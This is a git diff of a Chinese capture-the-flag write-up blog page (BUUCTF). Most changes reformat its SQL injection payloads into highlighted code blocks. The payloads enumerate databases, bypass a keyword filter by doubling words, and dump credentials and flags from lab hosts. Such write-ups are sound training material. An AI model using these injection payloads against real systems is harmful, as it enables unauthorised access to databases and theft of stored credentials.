@@ -55,7 +55,6 @@
 <meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlly1ge99o92e9pj30gs094wgj.jpg">
 <meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlly1ge99p7igmsj30f306wgn2.jpg">
 <meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlly1ge9a7bxtnbj308x01udfw.jpg">
-<meta property="og:image" content="https://lethalo.github.io/Users/ooo/Library/Application%20Support/typora-user-images/image-20200428213126802.png">
 <meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlly1geado84vybj30sv0bgwih.jpg">
 <meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlly1geadw3nf1fj313f05f76j.jpg">
 <meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlly1geaesfeb00j30e609htbx.jpg">
@@ -110,7 +109,7 @@
 <meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlly1geezvsza02j30bc039755.jpg">
 <meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlly1gef0rnwie2j3138067mzl.jpg">
 <meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlly1gef1emq1b3j30ml04wgny.jpg">
-<meta property="og:updated_time" content="2020-10-26T09:55:35.934Z">
+<meta property="og:updated_time" content="2020-10-26T10:00:20.664Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BUUCTF">
 <meta name="twitter:description" content="web[HCTF 2018]WarmUp 打开网站，在源代码中看到source.php   12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&amp;lt;?php    highlight_file(__FILE__);    class emmm    &amp;#123;">
@@ -629,7 +628,6 @@ height:50vh;
 <h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><ul>
 <li>查看网页源代码，发现对输入加了waf，访问新页面。</li>
 </ul>
-<p><img src="/Users/ooo/Library/Application%20Support/typora-user-images/image-20200428213126802.png" alt="image-20200428213126802"></p>
 <ul>
 <li>查看审计源码，</li>
 </ul>
@@ -826,28 +824,34 @@ height:50vh;
 <ul>
 <li>查询列名</li>
 </ul>
-<p><code>username=admin%27+order+by+4%23&amp;password=2f220bcd06402bd75238cead11becffb</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin%27+order+by+4%23&amp;password=2f220bcd06402bd75238cead11becffb</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gedtrzwyg7j30z008hwhd.jpg" alt="image-20200502085951905"></p>
 <ul>
 <li>查询数据库名<code>geek</code></li>
 </ul>
-<p><code>username=1%27union+select+1,database(),3%23&amp;password=2f220bcd06402bd75238cead11becffb</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1%27union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span>%<span class="number">23</span>&amp;<span class="keyword">password</span>=<span class="number">2</span>f220bcd06402bd75238cead11becffb</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gedtw6oqvfj30bk07tmzh.jpg" alt="image-20200502090347806"></p>
 <ul>
 <li>查询表名。</li>
 </ul>
-<p><code>username=1%27union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema=database()%23&amp;password=2f220bcd06402bd75238cead11becffb</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1%27union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span>+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">where</span>+table_schema=<span class="keyword">database</span>()%<span class="number">23</span>&amp;<span class="keyword">password</span>=<span class="number">2</span>f220bcd06402bd75238cead11becffb</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gedywbu3o1j30dx03jmyd.jpg" alt="image-20200502115701062"></p>
 <ul>
 <li>查询列名。</li>
 </ul>
-<p><code>http://60d82082-ad0a-43a8-a487-5527ec729898.node3.buuoj.cn/check.php?username=1%27union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_name=&#39;geekuser&#39;%23&amp;password=2f220bcd06402bd75238cead11becffb</code></p>
-<p><code>http://60d82082-ad0a-43a8-a487-5527ec729898.node3.buuoj.cn/check.php?username=1%27union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_name=&#39;I0ve1ysq1&#39;%23&amp;password=2f220bcd06402bd75238cead11becffb</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://60d82082-ad0a-43a8-a487-5527ec729898.node3.buuoj.cn/check.php?username=<span class="number">1</span>%<span class="number">27</span><span class="keyword">union</span>+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span>+<span class="keyword">from</span>+information_schema.columns+<span class="keyword">where</span>+table_name=<span class="string">'geekuser'</span>%<span class="number">23</span>&amp;<span class="keyword">password</span>=<span class="number">2</span>f220bcd06402bd75238cead11becffb</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://60d82082-ad0a-43a8-a487-5527ec729898.node3.buuoj.cn/check.php?username=<span class="number">1</span>%<span class="number">27</span><span class="keyword">union</span>+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span>+<span class="keyword">from</span>+information_schema.columns+<span class="keyword">where</span>+table_name=<span class="string">'I0ve1ysq1'</span>%<span class="number">23</span>&amp;<span class="keyword">password</span>=<span class="number">2</span>f220bcd06402bd75238cead11becffb</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gedz0oog4oj30dy04swg8.jpg" alt="image-20200502120114248"></p>
 <ul>
 <li>查询数据</li>
 </ul>
-<p><code>username=1%27union+select+1,group_concat(username),group_concat(password)+from+l0ve1ysq1%23&amp;password=2f220bcd06402bd75238cead11becffb</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1%27union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">group_concat</span>(username),<span class="keyword">group_concat</span>(<span class="keyword">password</span>)+<span class="keyword">from</span>+l0ve1ysq1%<span class="number">23</span>&amp;<span class="keyword">password</span>=<span class="number">2</span>f220bcd06402bd75238cead11becffb</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gedz5nnurhj30g0099gpg.jpg" alt="image-20200502120558915"></p>
 <h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><ul>
 <li>查看源码。</li>
@@ -951,7 +955,7 @@ height:50vh;
 <li>根据报错发现替换了or、union、select、from、where为空，使用双写能绕过进行常规注入。</li>
 </ul>
 <p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gef0rnwie2j3138067mzl.jpg" alt="image-20200503094718122"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">username=0%27+uniunionon+selselectect+1,database(),3%23&amp;password=123</span><br><span class="line"></span><br><span class="line">username=0%27+uniunionon+selselectect+1,group_concat(schema_name),3+frofromm+infoorrmation_schema. schemata%23&amp;password=123</span><br><span class="line"></span><br><span class="line">username=0%27+uniunionon+selselectect+1,group_concat(table_name),3+frofromm+infoorrmation_schema.tables+whewherere+table_schema=&quot;ctf&quot;%23&amp;password=123</span><br><span class="line"></span><br><span class="line">username=0%27+uniunionon+selselectect+1,group_concat(column_name),3+frofromm+infoorrmation_schema. columns+whewherere+table_name=&quot;Flag&quot;%23&amp;password=123</span><br><span class="line"></span><br><span class="line">username=0%27+uniunionon+selselectect+1,group_concat(flag),3+frofromm+ctf.Flag%23&amp;password=123</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">username=0%27+uniunionon+selselectect+1,database(),3%23&amp;password=123</span><br><span class="line"></span><br><span class="line">username=0%27+uniunionon+selselectect+1,group_concat(schema_name),3+frofromm+infoorrmation_schema. schemata%23&amp;password=123</span><br><span class="line"></span><br><span class="line">username=0%27+uniunionon+selselectect+1,group_concat(table_name),3+frofromm+infoorrmation_schema.tables+whewherere+table_schema="ctf"%23&amp;password=123</span><br><span class="line"></span><br><span class="line">username=0%27+uniunionon+selselectect+1,group_concat(column_name),3+frofromm+infoorrmation_schema. columns+whewherere+table_name="Flag"%23&amp;password=123</span><br><span class="line"></span><br><span class="line">username=0%27+uniunionon+selselectect+1,group_concat(flag),3+frofromm+ctf.Flag%23&amp;password=123</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gef1emq1b3j30ml04wgny.jpg" alt="image-20200503100923946"></p>
 <h3 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h3><ul>
@@ -1032,7 +1036,7 @@ height:50vh;
             <p>Author：<a href="https://lethalo.github.io">Lethal</a>
             <p>原文链接：<a href="https://lethalo.github.io/2020/04/24/BUUCTF/">https://lethalo.github.io/2020/04/24/BUUCTF/</a>
             <p>发表日期：<a href="https://lethalo.github.io/2020/04/24/BUUCTF/">April 24th 2020, 11:22:38 pm</a>
-            <p>更新日期：<a href="https://lethalo.github.io/2020/04/24/BUUCTF/">October 26th 2020, 5:55:35 pm</a>
+            <p>更新日期：<a href="https://lethalo.github.io/2020/04/24/BUUCTF/">October 26th 2020, 6:00:20 pm</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -1426,9 +1430,9 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
-    
         <span class="sidebar-tag-name" data-tags="Reerse"><span class="iconfont-archer">&#xe606;</span>Reerse</span>
+    
+        <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
     
         <span class="sidebar-tag-name" data-tags="dfs,c++"><span class="iconfont-archer">&#xe606;</span>dfs,c++</span>
     
